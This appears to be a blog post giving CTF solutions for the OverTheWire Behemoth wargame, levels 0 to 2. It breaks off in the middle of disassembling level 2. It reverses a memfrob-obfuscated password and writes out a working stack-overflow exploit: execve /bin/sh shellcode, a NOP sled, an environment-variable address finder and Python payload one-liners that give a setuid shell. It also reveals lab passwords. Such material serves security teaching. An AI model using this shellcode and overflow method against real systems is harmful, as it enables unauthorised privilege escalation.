---
tags: [ctf]
title: "OverTheWire - Behemoth Solutions 0-3"
classes: wide
comments: true
---

# Overview
OverTheWire hosts many security war games that range from Bandit for absolute beginners to intermediate games such as Maze or Vortez. This week we look at Behemoth which lies between Bandit and Vortez in terms of difficulty. It focuses on exploits involving buffer overflows, race conditions, and privilege esclation.

Let's get started with some solutions.

The challenges are located in /behemoth/ and the password files are located at etc/behemoth_pass/. Of course, a user can only read it's own password file (otherwise this wouldn't be a challenge at all). The goal therefore is to gain the privileges of another user and then read their password file to login to that account fully.

# Behemoth0
Let's start by changing to the directory with the challenges and seeing what's available:
```bash
behemoth0@behemoth:~$ cd /behemoth/
behemoth0@behemoth:/behemoth$ ls -l 
total 72
-r-sr-x--- 1 behemoth1 behemoth0 6156 Nov 21 07:55 behemoth0
-r-sr-x--- 1 behemoth2 behemoth1 5136 Nov 21 07:55 behemoth1
-r-sr-x--- 1 behemoth3 behemoth2 7692 Nov 21 07:55 behemoth2

```

We can see from the file permissions that behemoth is an executable program that uses setuid. Typically, when a user runs an executable, all commands are ran with that users permissions. Setuid can be used to run a command with the permissions of the user that created the executable. Therefore, since behemoth1 created the executable behemoth0, we can potentially use that to bring up a shell and read the behemoth1 password file as the behemoth1 user that has permission to read it.

OK, let's do some more analysis. I typically like to run the executable with and without arguments passed to it to see how it responds quickly. From there, we might need to disassemble the binary for futher hints.

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: helloworld
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0 testarg
Password: helloworld
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0        
Password: 



^C
behemoth0@behemoth:/behemoth$ 
```

From the console input above, we can see I tried running the executable a few different ways. Let's take a quick look at the binary now. 

The OverTheWire server that hosts this challenge comes with radare2 which can be used to disassemble and debug the program. It can also perform various checks on the binary to determine if security settings are enabled or disabled.

After starting up r2 with the binary loaded, we can run `iI` to get some information about the binary:

```
behemoth0@behemoth:/behemoth$ r2 -d behemoth0 
Process with PID 4256 started...
= attach 4256 4256
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Command layout is: <repeat><command><bytes>@<offset>.  For example: 3x20@0x33 will show 3 hexdumps of 20 bytes at 0x33
[0xf7fdaa20]> iI
arch     x86
binsz    4916
bintype  elf
bits     32
canary   true
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

Let's use radare to analyze the code for us and then print out any ASCII strings it can find. If we are lucky, the password could be a plaintext value within the data.

```bash
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 4256 4256
4256
[0xf7fdaa20]> iz
vaddr=0x08048780 paddr=0x00000780 ordinal=000 sz=24 len=23 section=.rodata type=ascii string=unixisbetterthanwindows
vaddr=0x08048798 paddr=0x00000798 ordinal=001 sz=21 len=20 section=.rodata type=ascii string=followthewhiterabbit
vaddr=0x080487ad paddr=0x000007ad ordinal=002 sz=20 len=19 section=.rodata type=ascii string=pacmanishighoncrack
vaddr=0x080487c1 paddr=0x000007c1 ordinal=003 sz=11 len=10 section=.rodata type=ascii string=Password: 
vaddr=0x080487cc paddr=0x000007cc ordinal=004 sz=5 len=4 section=.rodata type=ascii string=%64s
vaddr=0x080487d1 paddr=0x000007d1 ordinal=005 sz=17 len=16 section=.rodata type=ascii string=Access granted..
vaddr=0x080487e2 paddr=0x000007e2 ordinal=006 sz=8 len=7 section=.rodata type=ascii string=/bin/sh
vaddr=0x080487ea paddr=0x000007ea ordinal=007 sz=16 len=15 section=.rodata type=ascii string=Access denied..

[0xf7fdaa20]> 
```

The command `iz` will print out any strings. We see a few interesting strings... "unixisbetterthanwindows", "followthewhiterabbit", and "pacmanishighoncrack". Perhaps we try inputting these strings and seeing if that gets us further.
```bash
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: unixisbetterthanwindows
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: followthewhiterabbit
Access denied..
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: pacmanishighoncrack
Access denied..
```
OK, no luck with this. Let's disassemble the executable and see if that reveals something else.
```bash
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 16195 16195
16195
[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) main 244
|   main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|           ; var int local_10h @ esp+0x10
|           ; var int local_14h @ esp+0x14
|           ; var int local_18h @ esp+0x18
|           ; var int local_1fh @ esp+0x1f
|           ; var int local_23h @ esp+0x23
|           ; var int local_27h @ esp+0x27
|           ; var int local_2bh @ esp+0x2b
|           ; var int local_6ch @ esp+0x6c
|              ; DATA XREF from 0x080484f7 (entry0)
|           0x08048602      55             push ebp
|           0x08048603      89e5           mov ebp, esp
|           0x08048605      53             push ebx
|           0x08048606      83e4f0         and esp, 0xfffffff0
|           0x08048609      83ec70         sub esp, 0x70               ; 'p'
|           0x0804860c      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x08048612      8944246c       mov dword [local_6ch], eax
|           0x08048616      31c0           xor eax, eax
|           0x08048618      c744241f4f4b.  mov dword [local_1fh], 0x475e4b4f ; [0x475e4b4f:4]=-1
|           0x08048620      c74424235359.  mov dword [local_23h], 0x45425953 ; [0x45425953:4]=-1
|           0x08048628      c7442427585e.  mov dword [local_27h], 0x595e58 ; [0x595e58:4]=-1
|           0x08048630      c74424108087.  mov dword [local_10h], str.unixisbetterthanwindows ; [0x8048780:4]=0x78696e75 ; "unixisbetterthanwindows"
|           0x08048638      c74424149887.  mov dword [local_14h], str.followthewhiterabbit ; [0x8048798:4]=0x6c6c6f66 ; "followthewhiterabbit"
|           0x08048640      c7442418ad87.  mov dword [local_18h], str.pacmanishighoncrack ; [0x80487ad:4]=0x6d636170 ; "pacmanishighoncrack"
|           0x08048648      c70424c18704.  mov dword [esp], str.Password: ; [0x80487c1:4]=0x73736150 ; "Password: "
|           0x0804864f      e8ecfdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048654      8d44242b       lea eax, [local_2bh]        ; 0x2b ; '+' ; 43
|           0x08048658      89442404       mov dword [local_4h], eax
|           0x0804865c      c70424cc8704.  mov dword [esp], str._64s   ; [0x80487cc:4]=0x73343625 ; "%64s"
|           0x08048663      e858feffff     call sym.imp.__isoc99_scanf
|           0x08048668      8d44241f       lea eax, [local_1fh]        ; 0x1f ; 31
|           0x0804866c      890424         mov dword [esp], eax
|           0x0804866f      e82cfeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|           0x08048674      89442404       mov dword [local_4h], eax
|           0x08048678      8d44241f       lea eax, [local_1fh]        ; 0x1f ; 31
|           0x0804867c      890424         mov dword [esp], eax
|           0x0804867f      e859ffffff     call sym.memfrob
|           0x08048684      8d44241f       lea eax, [local_1fh]        ; 0x1f ; 31
|           0x08048688      89442404       mov dword [local_4h], eax
|           0x0804868c      8d44242b       lea eax, [local_2bh]        ; 0x2b ; '+' ; 43
|           0x08048690      890424         mov dword [esp], eax
|           0x08048693      e898fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x08048698      85c0           test eax, eax
|       ,=< 0x0804869a      7532           jne 0x80486ce
|       |   0x0804869c      c70424d18704.  mov dword [esp], str.Access_granted.. ; [0x80487d1:4]=0x65636341 ; "Access granted.."
|       |   0x080486a3      e8c8fdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080486a8      e8b3fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x080486ad      89c3           mov ebx, eax
|       |   0x080486af      e8acfdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x080486b4      895c2404       mov dword [local_4h], ebx
|       |   0x080486b8      890424         mov dword [esp], eax
|       |   0x080486bb      e8d0fdffff     call sym.imp.setreuid
|       |   0x080486c0      c70424e28704.  mov dword [esp], str._bin_sh ; [0x80487e2:4]=0x6e69622f ; "/bin/sh"
|       |   0x080486c7      e8b4fdffff     call sym.imp.system         ; int system(const char *string)
|      ,==< 0x080486cc      eb0c           jmp 0x80486da
|      |`-> 0x080486ce      c70424ea8704.  mov dword [esp], str.Access_denied.. ; [0x80487ea:4]=0x65636341 ; "Access denied.."
|      |    0x080486d5      e896fdffff     call sym.imp.puts           ; int puts(const char *s)
|      |       ; JMP XREF from 0x080486cc (main)
|      `--> 0x080486da      b800000000     mov eax, 0
|           0x080486df      8b54246c       mov edx, dword [local_6ch]  ; [0x6c:4]=-1 ; 'l' ; 108
|           0x080486e3      653315140000.  xor edx, dword gs:[0x14]
|       ,=< 0x080486ea      7405           je 0x80486f1
|       |   0x080486ec      e85ffdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x080486f1      8b5dfc         mov ebx, dword [local_4h_2]
|           0x080486f4      c9             leave
\           0x080486f5      c3             ret
[0xf7fdaa20]> 
```
We can see there are multiple system calls happening such as printf, scanf, strlen, and maybe the most interesting being memfrob. I was unfamiliar with this system call so I did a quick manpage lookup on the function.

![Figure 1-1](/assets/images/memfrob.png "Figure 1-1")

We can see that memfrob encrypts a memory region by XOR'ing with 42. Then a strcmp occurs between our input and the encrypted string. Let's set a breakpoint for radare to stop right before memfrob is executed and then take a look at the stack to determine what string it's encrypting.
```bash
[0xf7fdaa20]> db 0x0804867f
[0xf7fdaa20]> dc
Password: thisinputdoesntmatter
hit breakpoint at: 804867f
[0x0804867f]> px 100 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd590  afd5 ffff 0b00 0000 b0d5 ffff 0483 0408  ................
0xffffd5a0  8087 0408 9887 0408 ad87 0408 87c2 004f  ...............O
0xffffd5b0  4b5e 4753 5942 4558 5e59 0074 6869 7369  K^GSYBEX^Y.thisi
0xffffd5c0  6e70 7574 646f 6573 6e74 6d61 7474 6572  nputdoesntmatter
0xffffd5d0  0000 0000 0000 0000 3058 e4f7 4b87 0408  ........0X..K...
0xffffd5e0  0100 0000 a4d6 ffff acd6 ffff 2187 0408  ............!...
0xffffd5f0  dc73 fcf7                                .s..
[0x0804867f]> 
```
The first word (32 bits or 4 bytes) is the address of memory that contains the string to be encrypted. Note the address is stored in little-endian format so `afd5 ffff` actually means address `ffff d5af` which we can see starts at the character '0'.
Let's XOR "0K^GSYBEX^Y" with the value of 42 and we get "eatmyshorts". OK looking good. We could have also just set a breakpoint right at the strcmp function to see both strings in memory. Let's do that now to verify we got the right output from our XOR.
```bash
[0x0804867f]> db 0x08048693
[0x0804867f]> dc
hit breakpoint at: 8048693
[0x0804867f]> px 100 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd590  bbd5 ffff afd5 ffff b0d5 ffff 0483 0408  ................
0xffffd5a0  8087 0408 9887 0408 ad87 0408 87c2 0065  ...............e
0xffffd5b0  6174 6d79 7368 6f72 7473 0074 6869 7369  atmyshorts.thisi
0xffffd5c0  6e70 7574 646f 6573 6e74 6d61 7474 6572  nputdoesntmatter
0xffffd5d0  0000 0000 0000 0000 3058 e4f7 4b87 0408  ........0X..K...
0xffffd5e0  0100 0000 a4d6 ffff acd6 ffff 2187 0408  ............!...
0xffffd5f0  dc73 fcf7                                .s..
```
There it is - "eatmyshorts". OK let's try this for the password.
```bash
behemoth0@behemoth:/behemoth$ ./behemoth0   
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$ cat /etc/behemoth_pass/behemoth1
aesebootiv
$ 
```
Success!

# Behemoth1
For Behemoth1, I started this level the same way as level 0 - running the executable a few times with various inputs to get an idea of its output.
```bash
behemoth1@behemoth:/behemoth$ ./behemoth1         
Password: test
Authentication failure.
Sorry.
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: 
Authentication failure.
Sorry.
```
I decided to jump straight into radare with the binary and search for strings and disassemble the code.
```bash
behemoth1@behemoth:/behemoth$ r2 -d ./behemoth1         
Process with PID 16565 started...
= attach 16565 16565
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- You are probably using an old version of r2, go checkout the git!
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 16565 16565
16565
[0xf7fdaa20]> iz
vaddr=0x08048510 paddr=0x00000510 ordinal=000 sz=11 len=10 section=.rodata type=ascii string=Password: 
vaddr=0x0804851c paddr=0x0000051c ordinal=001 sz=31 len=30 section=.rodata type=ascii string=Authentication failure.\nSorry.

[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) sym.main 52
|   sym.main ();
|           ; var int local_1dh @ esp+0x1d
|              ; DATA XREF from 0x08048367 (entry0)
|           0x0804844d      55             push ebp
|           0x0804844e      89e5           mov ebp, esp
|           0x08048450      83e4f0         and esp, 0xfffffff0
|           0x08048453      83ec60         sub esp, 0x60               ; '`'
|           0x08048456      c70424108504.  mov dword [esp], str.Password: ; [0x8048510:4]=0x73736150 ; "Password: "
|           0x0804845d      e89efeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048462      8d44241d       lea eax, [local_1dh]        ; 0x1d ; 29
|           0x08048466      890424         mov dword [esp], eax
|           0x08048469      e8a2feffff     call sym.imp.gets           ; char*gets(char *s)
|           0x0804846e      c704241c8504.  mov dword [esp], str.Authentication_failure._nSorry. ; [0x804851c:4]=0x68747541 ; "Authentication failure.\nSorry."
|           0x08048475      e8a6feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804847a      b800000000     mov eax, 0
|           0x0804847f      c9             leave
\           0x08048480      c3             ret
```
Since challenge 0 didn't have a plaintext password, I seriously doubted it would be here but I figured I should check quickly anyways to confirm. The disassembly for main is interesting though. It seems the programs asks for the user to input a password but does nothing with it and will always print "Authentication failure.\nSorry.". We can also see that the program just uses gets() to read user input and doesn't do any checks on the length of input. This means we can attempt a stack buffer overflow. 

If you are unfamiliar with what a stack is or how a buffer overflow works, please see <CHANGE ME>. This does a pretty good job at explaining the basics of each. 

I'll also visualize how the buffer overflow will work in this case. Let's run the program up to `call sym.imp.gets` and then view the first 200 bytes of the stack:
```bash
[0xf7fdaa20]> db 0x08048469
[0xf7fdaa20]> dc
hit breakpoint at: 8048469
[0x08048469]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd5a0  bdd5 ffff 44d6 ffff 0070 fcf7 87c2 0000  ....D....p......
0xffffd5b0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5c0  0080 0000 0070 fcf7 0000 0000 2af3 e2f7  .....p......*...
0xffffd5d0  0100 0000 0000 0000 3058 e4f7 db84 0408  ........0X......
0xffffd5e0  0100 0000 a4d6 ffff acd6 ffff b184 0408  ................
0xffffd5f0  dc73 fcf7 fc81 0408 9984 0408 0000 0000  .s..............
0xffffd600  0070 fcf7 0070 fcf7 0000 0000 37f6 e2f7  .p...p......7...
0xffffd610  0100 0000 a4d6 ffff acd6 ffff 0000 0000  ................
0xffffd620  0000 0000 0000 0000 0070 fcf7 04dc fff7  .........p......
0xffffd630  00d0 fff7 0000 0000 0070 fcf7 0070 fcf7  .........p...p..
0xffffd640  0000 0000 8b4b 92d7 9b85 d5ed 0000 0000  .....K..........
0xffffd650  0000 0000 0000 0000 0100 0000 5083 0408  ............P...
0xffffd660  0000 0000 f0ef fef7                      ........
```
Now let's enter 40 characters (let's use 'A') and see how the stack changes:
```bash
[0x08048469]> db 0x0804846e
[0x08048469]> dc
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    
hit breakpoint at: 804846e
[0x08048469]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd5a0  bdd5 ffff 44d6 ffff 0070 fcf7 87c2 0000  ....D....p......
0xffffd5b0  ffff ffff 2f00 0000 c83d e2f7 a841 4141  ..../....=...AAA
0xffffd5c0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5d0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5e0  4141 4141 4100 ffff acd6 ffff b184 0408  AAAAA...........
0xffffd5f0  dc73 fcf7 fc81 0408 9984 0408 0000 0000  .s..............
0xffffd600  0070 fcf7 0070 fcf7 0000 0000 37f6 e2f7  .p...p......7...
0xffffd610  0100 0000 a4d6 ffff acd6 ffff 0000 0000  ................
0xffffd620  0000 0000 0000 0000 0070 fcf7 04dc fff7  .........p......
0xffffd630  00d0 fff7 0000 0000 0070 fcf7 0070 fcf7  .........p...p..
0xffffd640  0000 0000 8b4b 92d7 9b85 d5ed 0000 0000  .....K..........
0xffffd650  0000 0000 0000 0000 0100 0000 5083 0408  ............P...
0xffffd660  0000 0000 f0ef fef7                      ........
[0x08048469]> dc
Authentication failure.
Sorry.
```
We see our input gets placed starting at 0xffffd5bd. The program also ran as expected after we continued to the end. Let's re-run and this time input a larger string. Let's try 100 characters this time and see if this causes us to store memory past what's allocated for our input and into other stack variables.
```bash
[0xf7fd9be9]> ood
Wait event received by different pid 16565
Process with PID 16811 started...
File dbg:///behemoth/behemoth1  reopened in read-write mode
= attach 16811 16811
16811
[0xf7fdaa20]> dc
hit breakpoint at: 8048469
[0x08048469]> dc
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 804846e
[0x08048469]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd590  add5 ffff 34d6 ffff 0070 fcf7 87c2 0000  ....4....p......
0xffffd5a0  ffff ffff 2f00 0000 c83d e2f7 a841 4141  ..../....=...AAA
0xffffd5b0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5c0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5d0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5e0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd5f0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd600  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd610  0000 0000 0000 0000 0070 fcf7 04dc fff7  .........p......
0xffffd620  00d0 fff7 0000 0000 0070 fcf7 0070 fcf7  .........p...p..
0xffffd630  0000 0000 a804 895c b8ea ce66 0000 0000  .......\...f....
0xffffd640  0000 0000 0000 0000 0100 0000 5083 0408  ............P...
0xffffd650  0000 0000 f0ef fef7                      ........
[0x08048469]> dc
Authentication failure.
Sorry.
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
```
This time we got a segfault. We can see the register EIP (which is the location of current instruction) has a value of 0x41414141 (ASCII - AAAA). It appears we have overwritten the return address for the main function to be 0x41414141. It therefore jumped to that address but there are not any valid instructions at that address. 

The goal now is to determine how many 'A's is needed to change the return address. Once we determine that, we can change the return address to be an address of our choosing. By creating some shell code within the stack that opens up a shell using the file's creators file permissions, we can change the return address to point to that shell code which will cause it to execute. We will then be able to read the password for behemoth2. 

From trial and error, I determine that 81 bytes will change the first two bytes of the return address as seen below to our input character (0x41 - A):

```bash
[0xf7e20041]> ood
Wait event received by different pid 17047
Wait event received by different pid 17048
Process with PID 17049 started...
File dbg:///behemoth/behemoth1  reopened in read-write mode
= attach 17049 17049
17049
[0xf7fdaa20]> dc
hit breakpoint at: 8048469
[0x08048469]> dc
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 804846e
[0x08048469]> dc
Authentication failure.
Sorry.
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0xf7004141 code=1 ret=0
```

We therefore have determined that we have 79 bytes available for our shellcode and the following four bytes should be the address to the shellcode on the stack. The next problem to solve is determining where our shellcode sits on the stack. To assist with jumping to the shellcode, we can implement what's called a NOP sled. NOP stands for "No Operation" and will cause the EIP to increment it's value by 1 to read the next instruction without performing any other actions. By combining many NOPs together, we create a sled that causes EIP to slide all the way to our first shellcode instruction. That means we can change the return address to point to any of these NOPs and we will still execute our shellcode. 

First, let's generate the shell code. There are many ways to do this such as writing a simple C program with the desired code to run and then compiling it. Since generating shell code for opening a shell is so common, we will just pull some shellcode from online: `"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"`. This code opens a shell with the permissions of the user that created this executable file (behemoth2 in this case). This shellcode is 39 bytes in length so we should fill the rest of our input with NOP instructions (\x90). This will give us an input of 79 bytes and the next four bytes will be our address. From our investigation earlier, we saw our input is stored starting at address 0xffffd5ad. Since the address will change slightly depending on how the program is executed, let's increase our value by 5-10 bytes and try jumping there to start. If we are lucky, we will NOP sled into our shellcode.

Since it's hard to input raw bytes into stdin while the application is running, we will pipe the data into the program when we run the execution command. I use python in order to generate the input string but the system command echo can be used as well.

```bash
python -c 'print "\90"*40 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\xbc\xd5\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
```

Unfortunately we got a segmentation fault. It looks like we didn't choose the right return address. Let's tweak the return address in increments of 40 bytes to see if we can land in the NOP sled with a few different return addresses.

```bash
behemoth1@behemoth:/behemoth$ python -c 'print "\90"*40 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\xe4\xd5\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
behemoth1@behemoth:/behemoth$ python -c 'print "\90"*40 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x0c\xd6\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
behemoth1@behemoth:/behemoth$ python -c 'print "\90"*40 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x34\xd6\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
```

Alright so this isn't going as smoothly as I hoped. The challenge now is finding the address in the stack that we should jump to. Let's try another strategy that is similar but stores the shellcode in an environmental variable. I have a script that looks up where this environmental variable is stored on the stack. We can then change our address to this address and hopefully jump to where the environmental variable is stored and execute the shell code there. Let's do it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	char *ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```

Let's create a directory in the /tmp/ folder where we can save this piece of code, compile, and then run it. NOTE: This stategy only works when ASLR (Address Space Layout Randomizer) is disabled (which it is in this server).

```bash
behemoth1@behemoth:/behemoth$ mkdir /tmp/smhbehemoth1
behemoth1@behemoth:/behemoth$ cd /tmp/smhbehemoth1
behemoth1@behemoth:/behemoth$ touch findenvaddr.c
...
...
behemoth1@behemoth:/tmp/smhbehemoth1$ gcc -o findenvaddr.out findenvaddr.c 
```

Let's create our environmental variable and call it "EGG" now.
```bash
behemoth1@behemoth:/behemoth$ export EGG=$(python -c 'print "\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
```

To make sure our script works correctly, we need to pass in our program name in the same manner as we would call it normally. This is because the name of the program will slightly change where the other variables sit on the stack.

```bash
behemoth1@behemoth:/behemoth$ /tmp/smhbehemoth1/findenvaddr.out EGG ./behemoth1         
EGG will be at 0xffffd850
```

OK great, let's try this address and perhaps add a few bytes onto it to make sure we hit the NOPs.
```bash
behemoth1@behemoth:/tmp/smhbehemoth1$ python -c 'print "A"*79 + "\x50\xd8\xff\xff"' | /behemoth/behemoth1 
Password: Authentication failure.
Sorry.
```
No seg fault this time but we didn't get a shell. Turns out that for some reason, the program exits before we are given control to the shell. This can be fixed by appending ";cat" to our command to force the shell to wait for input.
```bash
behemoth1@behemoth:/tmp/smhbehemoth1$ (python -c 'print "A"*79 + "\x50\xd8\xff\xff"';cat) | /behemoth/behemoth1 
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
```
That's more like it. On to behemoth2.

# Behemoth2
OK we know the drill at this point. Let's run behemoth2.
```bash
behemoth2@behemoth:~$ cd /behemoth/
behemoth2@behemoth:/behemoth$ ./behemoth2 
touch: cannot touch '17820': Permission denied
^C
behemoth2@behemoth:/behemoth$ ./behemoth2 
touch: cannot touch '17823': Permission denied
^C
behemoth2@behemoth:/behemoth$ 
```

OK interesting response from just our first run. It looks like it's trying to create a file called '17820' and '17823' but it can't. It most likely can't create a file because we are executing the program from /behemoth/ which we don't have write permission in. Let's create a new /tmp/ directory and try running the program from there as we will have write privileges to that folder.
```bash
behemoth2@behemoth:/behemoth$ mkdir /tmp/smhbehemoth2
behemoth2@behemoth:/behemoth$ cd /tmp/smhbehemoth2
behemoth2@behemoth:/tmp/smhbehemoth2$ /behemoth/behemoth2 
^C
behemoth2@behemoth:/tmp/smhbehemoth2$ 
```

Cool, so we got rid of the touch error and the program seems to just hang. It's worth noting that this file name seems like it could be a PID. Reading the contents from the file show it's empty after we close the program.
```bash
behemoth2@behemoth:/tmp/smhbehemoth2$ /behemoth/behemoth2 
^C
behemoth2@behemoth:/tmp/smhbehemoth2$ ls -l
total 0
-rw-rw-r-- 1 behemoth3 behemoth2 0 Feb 24 03:10 17835
behemoth2@behemoth:/tmp/smhbehemoth2$ cat 17835 
behemoth2@behemoth:/tmp/smhbehemoth2$ 
```

Let's open the binary and see what's happening to get a better idea of how this could be exploited.

```bash
behemoth2@behemoth:/tmp/smhbehemoth2$ r2 -d /behemoth/behemoth2 
Process with PID 17914 started...
= attach 17914 17914
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Move between your search hits in visual mode using the 'f' and 'F' keys
[0xf7fdaa20]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 17914 17914
17914
[0xf7fdaa20]> pdf @ main
            ;-- main:
/ (fcn) main 254
|   main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; var int local_1ch @ esp+0x1c
|           ; var int local_20h @ esp+0x20
|           ; var int local_24h @ esp+0x24
|           ; var int local_28h @ esp+0x28
|           ; var int local_38h @ esp+0x38
|           ; var int local_9ch @ esp+0x9c
|              ; DATA XREF from 0x080484d7 (entry0)
|           0x080485bd      55             push ebp
|           0x080485be      89e5           mov ebp, esp
|           0x080485c0      53             push ebx
|           0x080485c1      83e4f0         and esp, 0xfffffff0
|           0x080485c4      81eca0000000   sub esp, 0xa0
|           0x080485ca      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x080485d0      8984249c0000.  mov dword [local_9ch], eax
|           0x080485d7      31c0           xor eax, eax
